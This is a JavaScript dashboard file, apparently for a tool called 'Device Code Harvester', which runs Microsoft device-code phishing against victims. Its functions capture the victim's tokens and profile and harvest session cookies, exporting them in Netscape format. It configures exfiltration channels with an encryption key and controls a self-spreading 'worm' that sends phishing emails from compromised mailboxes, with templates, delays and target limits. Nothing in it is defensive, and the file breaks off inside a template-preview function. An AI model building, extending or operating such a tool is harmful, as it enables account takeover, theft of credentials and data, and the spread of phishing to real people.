
// ==================== GLOBAL VARIABLES ====================
let eventSource = null;
let currentSessionId = null;
let currentSessionData = null;

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', function() {
    refreshAllStats();
    checkWormStatus();
    loadSettings();
    refreshProfilesList();
    startStatusPolling();
    setInterval(refreshAllStats, 30000);
}, { once: true });

// ==================== API HELPERS ====================
async function apiGet(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) return null;
        return await response.json();
    } catch (e) {
        console.error('API GET error:', e);
        return null;
    }
}

async function apiPost(url, data) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        return await response.json();
    } catch (e) {
        console.error('API POST error:', e);
        return null;
    }
}

// ==================== UI HELPERS ====================
function addLog(message, level = 'info') {
    const container = document.getElementById('logContainer');
    if (!container) return;
    
    const entry = document.createElement('div');
    entry.className = `log-entry log-${level}`;
    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    container.appendChild(entry);
    entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function showStatus(message, type = 'info') {
    const statusBar = document.getElementById('statusBar');
    statusBar.textContent = message;
    statusBar.className = '';
    statusBar.classList.add(type === 'success' ? 'badge-success' : (type === 'error' ? 'badge-danger' : 'badge-info'));
    statusBar.style.display = 'block';
    statusBar.style.padding = '12px 16px';
    statusBar.style.borderRadius = '8px';
    statusBar.style.marginBottom = '20px';
    
    setTimeout(() => {
        statusBar.style.display = 'none';
    }, 5000);
}

function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    const text = element.textContent;
    navigator.clipboard.writeText(text);
    addLog('Copied to clipboard', 'success');
    showStatus('Copied to clipboard!', 'success');
}

function toggleCollapse(collapseId) {
    const element = document.getElementById(collapseId);
    const header = element.previousElementSibling;
    if (element.classList.contains('hidden')) {
        element.classList.remove('hidden');
        header.innerHTML = header.innerHTML.replace('▶', '▼');
    } else {
        element.classList.add('hidden');
        header.innerHTML = header.innerHTML.replace('▼', '▶');
    }
}

// ==================== STATISTICS ====================
async function refreshAllStats() {
    try {
        const data = await apiGet('/api/worm/status');
        if (data) {
            document.getElementById('statPhished').textContent = data.phished_count || 0;
            document.getElementById('statCaptured').textContent = data.captured_count || 0;
            document.getElementById('statSessions').textContent = currentSessionId ? 1 : 0;
            
            // Update worm indicator
            const indicator = document.getElementById('wormIndicator');
            if (indicator) {
                if (data.enabled) {
                    indicator.className = 'badge badge-success';
                    indicator.innerHTML = `🐛 Worm: <strong>ENABLED</strong> | Phished: ${data.phished_count || 0} | Captured: ${data.captured_count || 0}`;
                } else {
                    indicator.className = 'badge badge-warning';
                    indicator.innerHTML = '🐛 Worm: DISABLED';
                }
            }
        }
    } catch (e) {
        console.error('Stats refresh failed:', e);
    }
}

// ==================== CAPTURE FUNCTIONS ====================
async function startCapture() {
    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.textContent = '⏳ Starting...';
    
    document.getElementById('captureCard').classList.remove('hidden');
    document.getElementById('resultsCard').classList.add('hidden');
    document.getElementById('deviceCodeArea').classList.add('hidden');
    document.getElementById('logContainer').innerHTML = '';
    document.getElementById('captureStatus').innerHTML = 'Initializing capture session...';
    
    const payload = {
        client_id: document.getElementById('clientId').value,
        tenant: document.getElementById('tenant').value,
        scope: document.getElementById('scope').value,
        max_endpoints: parseInt(document.getElementById('maxEndpoints').value) || 4,
        refresh: document.getElementById('refreshToken').checked,
        detect_ca: document.getElementById('detectCA').checked
    };
    
    if (!payload.client_id) {
        showStatus('Client ID is required!', 'error');
        btn.disabled = false;
        btn.textContent = '🚀 Start Capture';
        return;
    }
    
    try {
        addLog('Requesting device code from Microsoft...', 'info');
        const response = await fetch('/api/start-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        if (!response.ok) {
            showStatus('Error: ' + (data.error || 'Unknown error'), 'error');
            btn.disabled = false;
            btn.textContent = '🚀 Start Capture';
            return;
        }
        
        currentSessionId = data.session_id;
        addLog(`Session created: ${currentSessionId}`, 'success');
        addLog(`Device code: ${data.user_code}`, 'info');
        
        document.getElementById('captureStatus').innerHTML = '<span class="badge badge-success">● Device code obtained. Waiting for victim...</span>';
        document.getElementById('deviceCodeArea').classList.remove('hidden');
        document.getElementById('verificationUri').textContent = data.verification_uri;
        document.getElementById('userCode').textContent = data.user_code;
        
        if (eventSource) eventSource.close();
        eventSource = new EventSource(`/api/stream/${currentSessionId}`);
        
        eventSource.onmessage = function(e) {
            const msg = JSON.parse(e.data);
            if (msg.type === 'polling') {
                document.getElementById('captureStatus').innerHTML = `<span class="badge badge-info">● Polling... (interval: ${msg.interval}s)</span>`;
            } else if (msg.type === 'token_obtained') {
                addLog('Token obtained successfully!', 'success');
                document.getElementById('captureStatus').innerHTML = '<span class="badge badge-success">● Token captured! Extracting data...</span>';
                eventSource.close();
                finalizeCapture(currentSessionId);
            } else if (msg.type === 'error') {
                addLog(`Polling error: ${msg.message}`, 'error');
                showStatus(`Polling error: ${msg.message}`, 'error');
                eventSource.close();
                btn.disabled = false;
                btn.textContent = '🚀 Start Capture';
            }
        };
        
        eventSource.onerror = function() {
            addLog('EventSource connection error', 'error');
        };
        
    } catch (e) {
        showStatus('Error: ' + e.message, 'error');
        addLog(`Capture failed: ${e.message}`, 'error');
    } finally {
        btn.disabled = false;
        btn.textContent = '🚀 Start Capture';
    }
}

async function finalizeCapture(sessionId) {
    addLog('Extracting user profile and cookies...', 'info');
    
    try {
        const response = await fetch(`/api/finalize/${sessionId}`, { method: 'POST' });
        const data = await response.json();
        
        if (!response.ok) {
            showStatus('Extraction failed: ' + (data.error || 'Unknown'), 'error');
            return;
        }
        
        addLog('Capture complete! Processing results...', 'success');
        showStatus('Capture complete! Review results below.', 'success');
        displayResults(data);
        refreshAllStats();
        
    } catch (e) {
        addLog(`Extraction error: ${e.message}`, 'error');
    }
}

// ==================== DISPLAY RESULTS ====================
function displayResults(data) {
    currentSessionData = data.session;
    
    // Tokens
    const tokens = data.session.tokens;
    let tokensHtml = '';
    for (const [key, value] of Object.entries(tokens)) {
        const displayValue = value && value.length > 100 ? value.substring(0, 100) + '...' : (value || 'N/A');
        tokensHtml += `<div style="margin-bottom: 8px;"><strong>${key}:</strong><br><code style="font-size: 0.75rem; word-break: break-all;">${JSON.stringify(displayValue)}</code></div>`;
    }
    document.getElementById('tokensContent').innerHTML = tokensHtml;
    
    // User Info
    const user = data.session.user;
    let userHtml = '<div class="grid-2">';
    for (const [key, value] of Object.entries(user)) {
        if (value) userHtml += `<div><strong>${key}:</strong><br>${value}</div>`;
    }
    userHtml += '</div>';
    document.getElementById('userContent').innerHTML = userHtml || '<p class="text-muted">No user information available</p>';
    
    // Cookies
    document.getElementById('cookieCount').textContent = data.session.cookie_count;
    let cookiesHtml = '';
    for (const cookie of data.session.cookies) {
        cookiesHtml += `<div>${cookie.domain} | ${cookie.name}: ${cookie.value.substring(0, 50)}...</div>`;
    }
    document.getElementById('cookiesContent').innerHTML = cookiesHtml || '<p class="text-muted">No cookies harvested</p>';
    
    // Conditional Access
    if (data.ca_analysis && data.ca_analysis.length > 0) {
        let caHtml = '';
        for (const item of data.ca_analysis) {
            caHtml += `<div class="badge badge-info" style="margin: 4px;">🔒 ${item}</div>`;
        }
        document.getElementById('caContent').innerHTML = caHtml;
    } else {
        document.getElementById('caContent').innerHTML = '<p class="text-muted">No Conditional Access indicators detected</p>';
    }
    
    // Exfiltration Results
    if (data.exfil_results && Object.keys(data.exfil_results).length > 0) {
        let exfilHtml = '';
        for (const [channel, success] of Object.entries(data.exfil_results)) {
            const status = success ? '✅ Success' : '❌ Failed';
            exfilHtml += `<div>${channel}: ${status}</div>`;
        }
        document.getElementById('exfilContent').innerHTML = exfilHtml;
    } else {
        document.getElementById('exfilContent').innerHTML = '<p class="text-muted">No exfiltration channels configured</p>';
    }
    
    // Full Session
    document.getElementById('fullContent').textContent = JSON.stringify(data.session, null, 2);
    
    document.getElementById('resultsCard').classList.remove('hidden');
    document.getElementById('resultsCard').scrollIntoView({ behavior: 'smooth' });
}

// ==================== EXPORT FUNCTIONS ====================
function exportCookiesNetscape() {
    if (!currentSessionData || !currentSessionData.cookies) return;
    let lines = ['# Netscape HTTP Cookie File', '# Generated by Device Code Harvester'];
    for (const c of currentSessionData.cookies) {
        const domain = c.domain || '.microsoftonline.com';
        const domainFlag = domain.startsWith('.') ? 'TRUE' : 'FALSE';
        const secure = c.secure ? 'TRUE' : 'FALSE';
        const expiry = c.expirationDate ? Math.floor(c.expirationDate) : '0';
        lines.push(`${domain}\t${domainFlag}\t${c.path || '/'}\t${secure}\t${expiry}\t${c.name}\t${c.value}`);
    }
    downloadFile(lines.join('\n'), 'cookies_netscape.txt', 'text/plain');
}

function exportCookiesJSON() {
    if (!currentSessionData) return;
    downloadFile(JSON.stringify(currentSessionData.cookies, null, 2), 'cookies.json', 'application/json');
}

function downloadSession() {
    if (!currentSessionData) return;
    downloadFile(JSON.stringify(currentSessionData, null, 2), 'session_full.json', 'application/json');
}

function downloadFullReport() {
    if (!currentSessionData) return;
    const report = {
        timestamp: new Date().toISOString(),
        session: currentSessionData,
        summary: {
            user: currentSessionData.user.upn || currentSessionData.user.email,
            cookie_count: currentSessionData.cookie_count,
            has_refresh_token: !!currentSessionData.tokens.refresh_token
        }
    };
    downloadFile(JSON.stringify(report, null, 2), `report_${Date.now()}.json`, 'application/json');
}

function copyFullSession() {
    if (!currentSessionData) return;
    navigator.clipboard.writeText(JSON.stringify(currentSessionData, null, 2));
    addLog('Full session copied to clipboard', 'success');
}

function downloadFile(content, filename, mimeType) {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}

// ==================== CONFIGURATION MANAGEMENT ====================
async function loadSettings() {
    try {
        // Load worm config
        const response = await fetch('/api/worm/config');
        if (response.ok) {
            const data = await response.json();
            document.getElementById('wormEnabled').checked = data.enabled;
            document.getElementById('wormEnabledLabel').textContent = data.enabled ? 'Enabled' : 'Disabled';
            document.getElementById('wormMaxDepth').value = data.max_depth;
            document.getElementById('wormMaxTargets').value = data.max_targets;
            document.getElementById('wormParallelPollers').value = data.parallel_pollers;
            document.getElementById('wormMinDelay').value = data.min_email_delay;
            document.getElementById('wormMaxDelay').value = data.max_email_delay;
            document.getElementById('wormMinScore').value = data.min_score_threshold;
            document.getElementById('wormHtmlTemplate').value = data.html_template;
            document.getElementById('wormTxtTemplate').value = data.txt_template;
            document.getElementById('wormTargetDomain').value = data.target_domain;
        }
        
        // Load runtime overrides
        loadRuntimeOverrides();
    } catch (e) {
        console.error('Failed to load settings:', e);
        addLog('Failed to load settings: ' + e.message, 'warning');
    }
}

async function loadRuntimeOverrides() {
    const container = document.getElementById('runtimeOverridesContent');
    if (!container) return;
    container.textContent = 'Loading...';
    try {
        const resp = await fetch('/api/runtime-overrides');
        if (!resp.ok) {
            container.textContent = 'Failed to load overrides';
            return;
        }
        const data = await resp.json();
        const overrides = data.overrides || {};
        if (Object.keys(overrides).length === 0) {
            container.textContent = 'No runtime overrides present';
            return;
        }
        container.textContent = JSON.stringify(overrides, null, 2);
        // prepare editor
        const editor = document.getElementById('runtimeOverridesEditor');
        if (editor) editor.value = JSON.stringify(overrides, null, 2);
    } catch (e) {
        container.textContent = 'Error loading overrides: ' + e.message;
    }
}

function toggleEditOverrides() {
    const content = document.getElementById('runtimeOverridesContent');
    const editor = document.getElementById('runtimeOverridesEditor');
    const editBtn = document.getElementById('editOverridesBtn');
    const saveBtn = document.getElementById('saveOverridesBtn');
    const cancelBtn = document.getElementById('cancelOverridesBtn');
    if (!editor || !content) return;
    if (editor.classList.contains('hidden')) {
        editor.classList.remove('hidden');
        saveBtn.classList.remove('hidden');
        cancelBtn.classList.remove('hidden');
        content.classList.add('hidden');
        editBtn.textContent = 'Preview';
    } else {
        editor.classList.add('hidden');
        saveBtn.classList.add('hidden');
        cancelBtn.classList.add('hidden');
        content.classList.remove('hidden');
        editBtn.textContent = '✏️ Edit';
    }
}

function cancelEditOverrides() {
    toggleEditOverrides();
}

async function saveRuntimeOverrides() {
    const editor = document.getElementById('runtimeOverridesEditor');
    if (!editor) return;
    let parsed;
    try {
        parsed = JSON.parse(editor.value);
    } catch (e) {
        showStatus('Invalid JSON: ' + e.message, 'error');
        return;
    }
    try {
        const resp = await fetch('/api/runtime-overrides', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ overrides: parsed })
        });
        const data = await resp.json();
        if (resp.ok && data.success) {
            showStatus('Runtime overrides saved', 'success');
            addLog('Runtime overrides saved', 'success');
            // Apply to UI immediately
            applyOverridesToUI(parsed);
            toggleEditOverrides();
            loadRuntimeOverrides();
        } else {
            showStatus('Failed to save overrides: ' + (data.error || 'unknown'), 'error');
        }
    } catch (e) {
        showStatus('Error saving overrides: ' + e.message, 'error');
    }
}

function applyOverridesToUI(overrides) {
    if (!overrides || typeof overrides !== 'object') return;
    // Map environment keys to UI fields
    if (overrides.CLIENT_ID !== undefined) document.getElementById('clientId').value = overrides.CLIENT_ID || '';
    if (overrides.TENANT !== undefined) document.getElementById('tenant').value = overrides.TENANT || 'common';
    if (overrides.SCOPES !== undefined) document.getElementById('scope').value = overrides.SCOPES || overrides.SCOPES;
    if (overrides.SCOPE !== undefined) document.getElementById('scope').value = overrides.SCOPE || overrides.SCOPE;
    if (overrides.MAX_ENDPOINTS !== undefined) document.getElementById('maxEndpoints').value = overrides.MAX_ENDPOINTS;
    if (overrides.REFRESH_TOKEN !== undefined) document.getElementById('refreshToken').checked = String(overrides.REFRESH_TOKEN) === 'true' || overrides.REFRESH_TOKEN === true;
    if (overrides.DETECT_CA !== undefined) document.getElementById('detectCA').checked = String(overrides.DETECT_CA) === 'true' || overrides.DETECT_CA === true;
    if (overrides.PROXY_LIST !== undefined) document.getElementById('proxyList').value = overrides.PROXY_LIST || '';
    if (overrides.PLAYWRIGHT !== undefined) {
        const val = String(overrides.PLAYWRIGHT).toLowerCase();
        const checked = (val === 'true' || val === '1');
        const el = document.getElementById('playwrightEnabled');
        if (el) el.checked = checked;
        const lbl = document.getElementById('playwrightLabel');
        if (lbl) lbl.textContent = checked ? 'Enabled' : 'Disabled';
    }
    if (overrides.WORM_ENABLED !== undefined) {
        const val = String(overrides.WORM_ENABLED).toLowerCase();
        const checked = (val === 'true' || val === '1');
        const el = document.getElementById('wormEnabled');
        if (el) el.checked = checked;
        const lbl = document.getElementById('wormEnabledLabel');
        if (lbl) lbl.textContent = checked ? 'Enabled' : 'Disabled';
    }
    if (overrides.WORM_MAX_DEPTH !== undefined) document.getElementById('wormMaxDepth').value = overrides.WORM_MAX_DEPTH;
    if (overrides.WORM_MAX_TARGETS !== undefined) document.getElementById('wormMaxTargets').value = overrides.WORM_MAX_TARGETS;
    if (overrides.WORM_PARALLEL_POLLERS !== undefined) document.getElementById('wormParallelPollers').value = overrides.WORM_PARALLEL_POLLERS;
    if (overrides.WORM_MIN_EMAIL_DELAY !== undefined) document.getElementById('wormMinDelay').value = overrides.WORM_MIN_EMAIL_DELAY;
    if (overrides.WORM_MAX_EMAIL_DELAY !== undefined) document.getElementById('wormMaxDelay').value = overrides.WORM_MAX_EMAIL_DELAY;
    if (overrides.WORM_HTML_TEMPLATE !== undefined) document.getElementById('wormHtmlTemplate').value = overrides.WORM_HTML_TEMPLATE;
    if (overrides.WORM_TXT_TEMPLATE !== undefined) document.getElementById('wormTxtTemplate').value = overrides.WORM_TXT_TEMPLATE;
    if (overrides.EXFIL_CONFIG !== undefined) document.getElementById('exfilConfig').value = overrides.EXFIL_CONFIG || '';
    if (overrides.ENCRYPTION_KEY !== undefined) document.getElementById('encryptionKey').value = overrides.ENCRYPTION_KEY || '';
}

async function saveWormSettings(event) {
    const settings = {
        max_depth: parseInt(document.getElementById('wormMaxDepth').value),
        max_targets: parseInt(document.getElementById('wormMaxTargets').value),
        parallel_pollers: parseInt(document.getElementById('wormParallelPollers').value),
        min_email_delay: parseInt(document.getElementById('wormMinDelay').value),
        max_email_delay: parseInt(document.getElementById('wormMaxDelay').value),
        min_score_threshold: parseInt(document.getElementById('wormMinScore').value),
        enabled: document.getElementById('wormEnabled').checked
    };
    
    // Validate settings
    if (settings.max_depth < 1 || settings.max_depth > 5) {
        showStatus('Max depth must be between 1 and 5', 'error');
        return;
    }
    if (settings.min_email_delay >= settings.max_email_delay) {
        showStatus('Min delay must be less than max delay', 'error');
        return;
    }
    
    try {
        const btn = event.target;
        btn.disabled = true;
        btn.textContent = '⏳ Saving...';
        
        const response = await fetch('/api/worm/config/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(settings)
        });
        const data = await response.json();
        
        if (response.ok && data.success) {
            showStatus('✅ Worm settings saved and applied immediately!', 'success');
            addLog('Worm settings saved: ' + data.changes.join(', '), 'success');
            checkWormStatus();
        } else {
            showStatus('❌ Failed to save worm settings: ' + (data.error || 'unknown'), 'error');
        }
    } catch (e) {
        showStatus('❌ Error saving settings: ' + e.message, 'error');
    } finally {
        const btn = event ? event.target : document.getElementById('saveWormSettingsBtn');
        if (btn) {
            btn.disabled = false;
            btn.textContent = '💾 Save Worm Settings';
        }
    }
}

async function saveProxySettings(event) {
    const proxy_list = document.getElementById('proxyList').value.trim();
    
    // Validate proxy format if present
    if (proxy_list) {
        const proxies = proxy_list.split(',').map(p => p.trim());
        for (const p of proxies) {
            if (!p.match(/^https?:\/\//)) {
                showStatus('Invalid proxy format. Must start with http:// or https://', 'error');
                return;
            }
        }
    }
    
    try {
        const btn = event.target;
        btn.disabled = true;
        btn.textContent = '⏳ Saving...';
        
        const response = await fetch('/api/settings/proxy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ proxy_list })
        });
        const data = await response.json();
        
        if (response.ok && data.success) {
            showStatus(`✅ Proxy settings saved! (${data.proxy_count} proxies)`, 'success');
            addLog('Proxy settings saved and applied', 'success');
        } else {
            showStatus('❌ Failed to save proxy settings', 'error');
        }
    } catch (e) {
        showStatus('❌ Error saving proxy settings: ' + e.message, 'error');
    } finally {
        const btn = event?.target || document.getElementById('saveProxySettingsBtn');
        if (btn) {
            btn.disabled = false;
            btn.textContent = '💾 Save Proxy Settings';
        }
    }
}

async function saveExfilSettings(event) {
    const exfil_config = document.getElementById('exfilConfig').value.trim();
    const encryption_key = document.getElementById('encryptionKey').value.trim();
    
    // Validate JSON
    if (exfil_config) {
        try {
            JSON.parse(exfil_config);
        } catch (e) {
            showStatus('Invalid JSON in exfil config: ' + e.message, 'error');
            return;
        }
    }
    
    // Validate encryption key format
    if (encryption_key && !encryption_key.match(/^[0-9a-fA-F]+$/)) {
        showStatus('Encryption key must be hex format (0-9, a-f)', 'error');
        return;
    }
    
    try {
        const btn = event.target;
        btn.disabled = true;
        btn.textContent = '⏳ Saving...';
        
        const response = await fetch('/api/settings/exfil', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ exfil_config, encryption_key })
        });
        const data = await response.json();
        
        if (response.ok && data.success) {
            showStatus(`✅ Exfil settings saved! (${data.channels_configured} channels)`, 'success');
            addLog('Exfil settings saved and applied', 'success');
        } else {
            showStatus('❌ Failed: ' + (data.error || 'unknown'), 'error');
        }
    } catch (e) {
        showStatus('❌ Error saving exfil settings: ' + e.message, 'error');
    } finally {
        const btn = event?.target || document.getElementById('saveExfilSettingsBtn');
        if (btn) {
            btn.disabled = false;
            btn.textContent = '💾 Save Exfil Settings';
        }
    }
}

async function testExfilSettings(event) {
    try {
        const btn = event.target;
        btn.disabled = true;
        btn.textContent = '⏳ Testing...';

        const resultCard = document.getElementById('exfilTestResult');
        const badge = document.getElementById('exfilTestBadge');
        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
        resultCard.classList.add('test-result-running');
        badge.classList.remove('badge-success', 'badge-danger', 'badge-info');
        badge.classList.add('badge-info', 'badge-spinner');
        badge.textContent = 'RUNNING';
        resultCard.style.display = 'block';
        document.getElementById('exfilTestResultBody').innerHTML = '<pre style="white-space: pre-wrap; word-break: break-word;">Running exfil test... please wait.</pre>';

        const response = await fetch('/api/exfil/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        badge.classList.remove('badge-spinner');

        if (response.ok && data.success) {
            resultCard.classList.add('test-result-success');
            badge.classList.remove('badge-info', 'badge-spinner');
            badge.classList.add('badge-success');
            badge.textContent = 'PASS';
            showStatus('✅ Exfil test succeeded!', 'success');
            addLog('Exfil test succeeded', 'success');
            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">PASS\n${JSON.stringify(data.results, null, 2)}</pre>`;
        } else {
            resultCard.classList.add('test-result-failure');
            badge.classList.remove('badge-info', 'badge-spinner');
            badge.classList.add('badge-danger');
            badge.textContent = 'FAIL';
            showStatus('❌ Exfil test failed: ' + (data.error || JSON.stringify(data.results || data)), 'error');
            addLog('Exfil test failed: ' + (data.error || JSON.stringify(data.results || data)), 'danger');
            document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">FAIL\n${JSON.stringify(data.results || data.error || data, null, 2)}</pre>`;
        }
    } catch (e) {
        showStatus('❌ Error testing exfil settings: ' + e.message, 'error');
        addLog('Error testing exfil settings: ' + e.message, 'danger');
        const resultCard = document.getElementById('exfilTestResult');
        const badge = document.getElementById('exfilTestBadge');
        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
        resultCard.classList.add('test-result-failure');
        badge.classList.remove('badge-success', 'badge-danger', 'badge-info', 'badge-spinner');
        badge.classList.add('badge-danger');
        badge.textContent = 'FAIL';
        resultCard.style.display = 'block';
        document.getElementById('exfilTestResultBody').innerHTML = `<pre style="white-space: pre-wrap; word-break: break-word;">${e.message}</pre>`;
    } finally {
        const btn = event?.target || document.getElementById('testExfilSettingsBtn');
        if (btn) {
            btn.disabled = false;
            btn.textContent = '🧪 Test Exfil Settings';
        }
    }
}


// ==================== PROFILE MANAGEMENT ====================
async function saveCurrentProfile() {
    const name = document.getElementById('newProfileName').value;
    if (!name) {
        showStatus('Please enter a profile name', 'warning');
        return;
    }
    
    const config = {
        client_id: document.getElementById('clientId').value,
        tenant: document.getElementById('tenant').value,
        scope: document.getElementById('scope').value,
        max_endpoints: parseInt(document.getElementById('maxEndpoints').value),
        refresh_token: document.getElementById('refreshToken').checked,
        detect_ca: document.getElementById('detectCA').checked
    };
    
    try {
        const response = await fetch('/api/config/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, config })
        });
        if (response.ok) {
            showStatus(`Profile "${name}" saved successfully`, 'success');
            refreshProfilesList();
            document.getElementById('newProfileName').value = '';
        } else {
            showStatus('Failed to save profile', 'error');
        }
    } catch (e) {
        showStatus('Error saving profile: ' + e.message, 'error');
    }
}

async function quickSaveProfile() {
    const name = prompt('Enter profile name:');
    if (name) {
        document.getElementById('newProfileName').value = name;
        await saveCurrentProfile();
    }
}

async function loadDefaultConfig() {
    document.getElementById('clientId').value = '';
    document.getElementById('tenant').value = 'common';
    document.getElementById('scope').value = 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/Files.ReadWrite.All https://graph.microsoft.com/User.Read openid offline_access profile';
    document.getElementById('maxEndpoints').value = '4';
    document.getElementById('refreshToken').checked = true;
    document.getElementById('detectCA').checked = true;
    addLog('Loaded default configuration', 'info');
}

async function refreshProfilesList() {
    try {
        const response = await fetch('/api/config/list');
        const data = await response.json();
        const container = document.getElementById('profilesList');
        
        if (!data.configs || Object.keys(data.configs).length === 0) {
            container.innerHTML = '<p class="text-muted text-center" style="padding: 20px;">No saved profiles</p>';
            return;
        }
        
        container.innerHTML = '';
        for (const [name, config] of Object.entries(data.configs)) {
            container.innerHTML += `
                <div class="profile-item">
                    <div>
                        <strong>${name}</strong><br>
                        <small class="text-muted">Client: ${config.client_id ? config.client_id.substring(0, 30) + '...' : 'Not set'}</small>
                    </div>
                    <div class="flex">
                        <button class="btn btn-secondary" onclick="loadProfile('${name}')">Load</button>
                        <button class="btn btn-danger" onclick="deleteProfile('${name}')">Delete</button>
                    </div>
                </div>
            `;
        }
    } catch (e) {
        console.log('Failed to refresh profiles list');
    }
}

async function loadProfile(name) {
    try {
        const response = await fetch(`/api/config/load/${name}`);
        const config = await response.json();
        
        document.getElementById('clientId').value = config.client_id || '';
        document.getElementById('tenant').value = config.tenant || 'common';
        document.getElementById('scope').value = config.scope || '';
        document.getElementById('maxEndpoints').value = config.max_endpoints || 4;
        document.getElementById('refreshToken').checked = config.refresh_token !== false;
        document.getElementById('detectCA').checked = config.detect_ca !== false;
        
        showStatus(`Loaded profile "${name}"`, 'success');
        addLog(`Loaded profile: ${name}`, 'success');
    } catch (e) {
        showStatus('Failed to load profile', 'error');
    }
}

async function deleteProfile(name) {
    if (!confirm(`Delete profile "${name}"?`)) return;
    
    try {
        const response = await fetch(`/api/config/delete/${name}`, { method: 'DELETE' });
        if (response.ok) {
            showStatus(`Profile "${name}" deleted`, 'success');
            refreshProfilesList();
        } else {
            showStatus('Failed to delete profile', 'error');
        }
    } catch (e) {
        showStatus('Error deleting profile', 'error');
    }
}

async function exportAllProfiles() {
    try {
        const response = await fetch('/api/config/export');
        const data = await response.json();
        downloadFile(JSON.stringify(data, null, 2), `profiles_${Date.now()}.json`, 'application/json');
        addLog('Profiles exported', 'success');
    } catch (e) {
        showStatus('Failed to export profiles', 'error');
    }
}

async function importProfiles() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'application/json';
    input.onchange = async (e) => {
        const file = e.target.files[0];
        const text = await file.text();
        const configs = JSON.parse(text);
        
        const response = await fetch('/api/config/import', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ configs })
        });
        
        if (response.ok) {
            showStatus(`Imported ${Object.keys(configs).length} profiles`, 'success');
            refreshProfilesList();
        } else {
            showStatus('Failed to import profiles', 'error');
        }
    };
    input.click();
}

async function confirmClearOverrides() {
    if (!confirm('Clear runtime overrides and restore .env defaults? This will remove any settings you applied from the dashboard.')) return;
    try {
        const resp = await fetch('/api/runtime-overrides/clear', { method: 'POST' });
        const data = await resp.json();
        if (resp.ok && data.success) {
            showStatus('Runtime overrides cleared. Refreshing page...', 'success');
            addLog('Runtime overrides cleared', 'success');
            setTimeout(() => location.reload(), 800);
        } else {
            showStatus('Failed to clear overrides: ' + (data.error || 'unknown'), 'error');
        }
    } catch (e) {
        showStatus('Error clearing overrides: ' + e.message, 'error');
    }
}

// ==================== UI HELPERS ====================
function clearOutput() {
    document.getElementById('logContainer').innerHTML = '';
    document.getElementById('resultsCard').classList.add('hidden');
    document.getElementById('captureCard').classList.add('hidden');
    if (eventSource) eventSource.close();
    currentSessionId = null;
    addLog('Output cleared', 'info');
}

function toggleTheme() {
    const root = document.documentElement;
    const isDark = getComputedStyle(root).getPropertyValue('--bg-primary').trim() === '#0a0c10';
    
    if (isDark) {
        root.style.setProperty('--bg-primary', '#ffffff');
        root.style.setProperty('--bg-secondary', '#f6f8fa');
        root.style.setProperty('--bg-tertiary', '#ffffff');
        root.style.setProperty('--text-primary', '#1f2328');
        root.style.setProperty('--text-secondary', '#656d76');
        root.style.setProperty('--border', '#d0d7de');
    } else {
        root.style.setProperty('--bg-primary', '#0a0c10');
        root.style.setProperty('--bg-secondary', '#161b22');
        root.style.setProperty('--bg-tertiary', '#0d1117');
        root.style.setProperty('--text-primary', '#ffffff');
        root.style.setProperty('--text-secondary', '#8b949e');
        root.style.setProperty('--border', '#30363d');
    }
}

function openSettingsModal() {
    document.getElementById('settingsModal').classList.add('active');
    loadSettings();
}

function closeSettingsModal() {
    document.getElementById('settingsModal').classList.remove('active');
}

function switchTab(tabId) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelector(`[onclick="switchTab('${tabId}')"]`).classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

// Event listeners for toggle switches
document.getElementById('wormEnabled')?.addEventListener('change', function(e) {
    document.getElementById('wormEnabledLabel').textContent = e.target.checked ? 'Enabled' : 'Disabled';
});

document.getElementById('playwrightEnabled')?.addEventListener('change', function(e) {
    document.getElementById('playwrightLabel').textContent = e.target.checked ? 'Enabled' : 'Disabled';
});

// ==================== WORM FUNCTIONS ====================
async function checkWormStatus() {
    try {
        const resp = await fetch('/api/worm/status');
        const data = await resp.json();
        const indicator = document.getElementById('wormIndicator');
        const wormCard = document.getElementById('statWormEnabled');
        if (indicator) {
            if (data.enabled) {
                indicator.className = 'badge badge-success';
                indicator.innerHTML = `🐛 Worm: <strong>ENABLED</strong> | Phished: ${data.phished_count || 0} | Captured: ${data.captured_count || 0}`;
            } else {
                indicator.className = 'badge badge-warning';
                indicator.innerHTML = '🐛 Worm: DISABLED';
            }
        }
        if (wormCard) {
            if (data.enabled) {
                wormCard.textContent = 'ENABLED';
                wormCard.style.color = 'var(--success)';
            } else {
                wormCard.textContent = 'DISABLED';
                wormCard.style.color = 'var(--danger)';
            }
        }
    } catch (e) {
        console.error('Failed to check worm status:', e);
    }
}

async function previewWormTemplate() {
    const preview = document.getElementById('wormTemplatePreview');
    const content = document.getElementById('wormTemplateContent');
    const info = document.getElementById('wormTemplateInfo');
    
    if (!preview.classList.contains('hidden')) {
        preview.classList.add('hidden');
        return;
    }
    
